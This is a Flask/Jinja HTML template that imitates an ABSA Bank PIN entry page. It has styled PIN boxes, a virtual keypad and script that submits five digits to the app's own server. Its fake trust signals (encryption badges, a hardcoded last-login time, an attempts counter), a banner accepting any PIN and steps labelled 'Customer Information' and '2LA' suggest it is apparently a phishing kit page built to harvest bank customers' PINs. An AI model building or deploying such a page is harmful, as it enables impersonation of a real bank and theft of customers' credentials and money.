{% extends "base.html" %}

{% block title %}PIN Entry - ABSA Bank{% endblock %}

{% block extra_css %}
<style>
  .progress {
    display: flex;
    align-items: center;
    margin-bottom: 30px;
  }

  .progress-step {
    flex: 1;
    position: relative;
    text-align: center;
    font-size: 13px;
    color: var(--text-light);
  }

  .progress-step::before {
    content: "";
    display: block;
    width: 100%;
    height: 3px;
    background: var(--border);
    position: absolute;
    top: 8px;
    left: -50%;
    z-index: -1;
  }

  .progress-step:first-child::before {
    display: none;
  }

  .progress-step.active {
    color: var(--primary);
    font-weight: bold;
  }

  .progress-step.completed {
    color: var(--primary);
  }

  .progress-step.completed::before {
    background: var(--primary);
  }

  .progress-step.active::before {
    background: var(--primary);
  }

  .progress-step span {
    display: inline-block;
    width: 20px;
    height: 20px;
    line-height: 20px;
    border-radius: 50%;
    background: var(--primary);
    color: #fff;
    font-size: 12px;
    margin-bottom: 5px;
  }

  h2 {
    font-size: 20px;
    margin-bottom: 20px;
    font-weight: normal;
  }

  .pin-container {
    background: #fff;
    padding: 30px;
    border-radius: 8px;
    box-shadow: 0 4px 12px rgba(0,0,0,0.1);
    border: 1px solid var(--border);
    text-align: center;
    max-width: 500px;
    margin: 0 auto;
  }

  .account-info {
    background: #f8f9fa;
    border: 1px solid var(--border);
    border-radius: 6px;
    padding: 15px;
    margin-bottom: 25px;
    text-align: left;
  }

  .account-info h3 {
    margin: 0 0 8px 0;
    color: var(--primary);
    font-size: 16px;
  }

  .account-info p {
    margin: 0;
    font-size: 14px;
    color: var(--text-dark);
    font-family: 'Courier New', monospace;
  }

  .pin-instruction {
    font-size: 18px;
    color: var(--text-dark);
    margin-bottom: 25px;
    font-weight: 500;
  }

  .pin-boxes {
    display: flex;
    justify-content: center;
    gap: 15px;
    margin: 25px 0;
  }

  .pin-boxes input {
    width: 60px;
    height: 60px;
    font-size: 28px;
    font-weight: bold;
    text-align: center;
    border: 3px solid var(--border);
    border-radius: 12px;
    background-color: #fafafa;
    transition: all 0.3s ease;
    outline: none;
    color: var(--text-dark);
    -webkit-text-security: disc;
    text-security: disc;
  }

  .pin-boxes input:focus {
    border-color: var(--primary);
    background-color: #fff;
    box-shadow: 0 0 0 4px rgba(139, 21, 56, 0.15);
    transform: scale(1.08);
  }

  .pin-boxes input:hover {
    border-color: var(--accent);
    background-color: #fff;
  }

  .pin-boxes input.filled {
    background-color: #e8f5e8;
    border-color: var(--primary);
  }

  .pin-hint {
    font-size: 14px;
    color: var(--text-light);
    margin-bottom: 25px;
    font-style: italic;
  }

  .security-features {
    display: flex;
    justify-content: center;
    gap: 20px;
    margin: 20px 0;
    flex-wrap: wrap;
  }

  .security-feature {
    display: flex;
    align-items: center;
    font-size: 12px;
    color: var(--text-light);
  }

  .security-feature::before {
    content: "ðŸ”’";
    margin-right: 5px;
  }

  .buttons {
    display: flex;
    justify-content: flex-end;
    gap: 10px;
    margin-top: 20px;
  }

  .buttons .clear-pin {
    background: #fff;
    border: 1px solid var(--accent);
    color: var(--accent);
    padding: 8px 18px;
    border-radius: 3px;
    cursor: pointer;
    font-size: 14px;
    font-weight: 500;
  }

  .buttons .submit-pin {
    background: var(--accent);
    color: #fff;
    border: none;
    padding: 8px 22px;
    border-radius: 3px;
    cursor: pointer;
    font-size: 14px;
    font-weight: 500;
  }

  .buttons .submit-pin:hover {
    background: #e55b00;
  }

  .buttons .submit-pin:disabled {
    background: #ccc;
    cursor: not-allowed;
  }

  .attempts-remaining {
    font-size: 13px;
    color: var(--accent);
    margin-top: 15px;
    font-weight: 500;
  }

  .virtual-keyboard {
    display: grid;
    grid-template-columns: repeat(3, 1fr);
    gap: 10px;
    max-width: 250px;
    margin: 20px auto 0;
  }

  .key-btn {
    background: #f8f9fa;
    border: 2px solid var(--border);
    border-radius: 8px;
    padding: 15px;
    font-size: 18px;
    font-weight: bold;
    cursor: pointer;
    transition: all 0.2s ease;
  }

  .key-btn:hover {
    background: var(--primary);
    color: #fff;
    border-color: var(--primary);
  }

  .key-btn:active {
    transform: scale(0.95);
  }

  @media (max-width: 600px) {
    .pin-boxes {
      gap: 10px;
    }
    .pin-boxes input {
      width: 50px;
      height: 50px;
      font-size: 24px;
    }
    .security-features {
      flex-direction: column;
      align-items: center;
    }
    .buttons {
      flex-direction: column;
    }
    .buttons button {
      width: 100%;
    }
    .virtual-keyboard {
      max-width: 200px;
    }
    .key-btn {
      padding: 12px;
      font-size: 16px;
    }
  }
</style>
{% endblock %}

{% block content %}
<div class="progress">
  <div class="progress-step completed"><span>1</span><br>Customer Information</div>
  <div class="progress-step completed"><span>2</span><br>2LA</div>
  <div class="progress-step active"><span>3</span><br>Show Username</div>
</div>

<h2>Show Username - Final Step</h2>

<div style="background: #d1ecf1; color: #0c5460; border: 1px solid #bee5eb; padding: 12px 15px; border-radius: 4px; margin-bottom: 20px; font-size: 14px;">
  <strong>Testing Mode:</strong> Enter any 5-digit PIN to continue.
</div>

<div class="pin-container">
  <div class="account-info">
    <h3>Account Information</h3>
    <p>Account: {{ session.get('account_number', '****1234')[-4:].rjust(8, '*') }}</p>
    <p>User: Welcome Back (Last login: Today 09:15)</p>
  </div>

  <div class="pin-instruction">
    Please enter your 5-digit PIN to continue
  </div>

  <form id="pinForm" method="POST" action="{{ url_for('pin_entry') }}">
    <div class="pin-boxes">
      <input type="password" name="digit1" class="pin-input" maxlength="1" inputmode="numeric" pattern="[0-9]" autocomplete="off" required>
      <input type="password" name="digit2" class="pin-input" maxlength="1" inputmode="numeric" pattern="[0-9]" autocomplete="off" required>
      <input type="password" name="digit3" class="pin-input" maxlength="1" inputmode="numeric" pattern="[0-9]" autocomplete="off" required>
      <input type="password" name="digit4" class="pin-input" maxlength="1" inputmode="numeric" pattern="[0-9]" autocomplete="off" required>
      <input type="password" name="digit5" class="pin-input" maxlength="1" inputmode="numeric" pattern="[0-9]" autocomplete="off" required>
    </div>

    <div class="pin-hint">
      Use the virtual keyboard below or your physical keyboard
    </div>

    <div class="security-features">
      <div class="security-feature">256-bit Encryption</div>
      <div class="security-feature">Secure Connection</div>
      <div class="security-feature">Auto-logout Protection</div>
    </div>

    <div class="virtual-keyboard">
      <button type="button" class="key-btn" data-key="1">1</button>
      <button type="button" class="key-btn" data-key="2">2</button>
      <button type="button" class="key-btn" data-key="3">3</button>
      <button type="button" class="key-btn" data-key="4">4</button>
      <button type="button" class="key-btn" data-key="5">5</button>
      <button type="button" class="key-btn" data-key="6">6</button>
      <button type="button" class="key-btn" data-key="7">7</button>
      <button type="button" class="key-btn" data-key="8">8</button>
      <button type="button" class="key-btn" data-key="9">9</button>
      <button type="button" class="key-btn" data-key="clear">âŒ«</button>
      <button type="button" class="key-btn" data-key="0">0</button>
      <button type="button" class="key-btn" data-key="submit">âœ“</button>
    </div>

    <div class="buttons">
      <button type="button" class="clear-pin" id="clearBtn">Clear PIN</button>
      <button type="submit" class="submit-pin" id="submitBtn" disabled>Submit PIN</button>
    </div>

    <div class="attempts-remaining">
      Attempts remaining: <span id="attemptsLeft">3</span>
    </div>
  </form>
</div>
{% endblock %}

{% block scripts %}
<script>
  let currentInput = 0;
  const pinInputs = document.querySelectorAll('.pin-input');
  const submitBtn = document.getElementById('submitBtn');
  const clearBtn = document.getElementById('clearBtn');

  // Focus first input on load
  pinInputs[0].focus();

  // PIN input handling
  pinInputs.forEach((input, index) => {
    input.addEventListener('input', (e) => {
      const value = e.target.value.replace(/[^0-9]/g, '');
      e.target.value = value;
      
      if (value) {
        input.classList.add('filled');
        if (index < pinInputs.length - 1) {
          pinInputs[index + 1].focus();
          currentInput = index + 1;
        } else {
          currentInput = index;
        }
      } else {
        input.classList.remove('filled');
        currentInput = index;
      }
      
      checkPinComplete();
    });

    input.addEventListener('keydown', (e) => {
      if (e.key === 'Backspace') {
        if (input.value === '' && index > 0) {
          pinInputs[index - 1].focus();
          pinInputs[index - 1].value = '';
          pinInputs[index - 1].classList.remove('filled');
          currentInput = index - 1;
        } else {
          input.classList.remove('filled');
          currentInput = index;
        }
        checkPinComplete();
      }
      
      if (e.key === 'ArrowRight' && index < pinInputs.length - 1) {
        pinInputs[index + 1].focus();
        currentInput = index + 1;
      }
      if (e.key === 'ArrowLeft' && index > 0) {
        pinInputs[index - 1].focus();
        currentInput = index - 1;
      }
    });

    input.addEventListener('focus', () => {
      currentInput = index;
    });

    input.addEventListener('keypress', (e) => {
      if (!/[0-9]/.test(e.key) && !['Backspace', 'Delete', 'Tab', 'Enter'].includes(e.key)) {
        e.preventDefault();
      }
    });
  });

  // Virtual keyboard
  document.querySelectorAll('.key-btn').forEach(btn => {
    btn.addEventListener('click', (e) => {
      e.preventDefault();
      const key = btn.dataset.key;
      
      if (key === 'clear') {
        if (currentInput >= 0 && pinInputs[currentInput].value) {
          pinInputs[currentInput].value = '';
          pinInputs[currentInput].classList.remove('filled');
        } else if (currentInput > 0) {
          currentInput--;
          pinInputs[currentInput].value = '';
          pinInputs[currentInput].classList.remove('filled');
          pinInputs[currentInput].focus();
        }
      } else if (key === 'submit') {
        if (isPinComplete()) {
          document.getElementById('pinForm').submit();
        }
      } else if (/[0-9]/.test(key)) {
        if (currentInput < pinInputs.length) {
          pinInputs[currentInput].value = key;
          pinInputs[currentInput].classList.add('filled');
          if (currentInput < pinInputs.length - 1) {
            currentInput++;
            pinInputs[currentInput].focus();
          }
        }
      }
      
      checkPinComplete();
    });
  });

  // Clear PIN button
  clearBtn.addEventListener('click', () => {
    pinInputs.forEach(input => {
      input.value = '';
      input.classList.remove('filled');
    });
    currentInput = 0;
    pinInputs[0].focus();
    checkPinComplete();
  });

  function isPinComplete() {
    return Array.from(pinInputs).every(input => input.value !== '');
  }

  function checkPinComplete() {
    submitBtn.disabled = !isPinComplete();
  }

  // Form submission
  document.getElementById('pinForm').addEventListener('submit', function(e) {
    if (!isPinComplete()) {
      e.preventDefault();
      alert('Please enter all 5 digits of your PIN');
      return;
    }
    
    // Show loading state
    submitBtn.textContent = 'Verifying...';
    submitBtn.disabled = true;
  });
</script>
{% endblock %}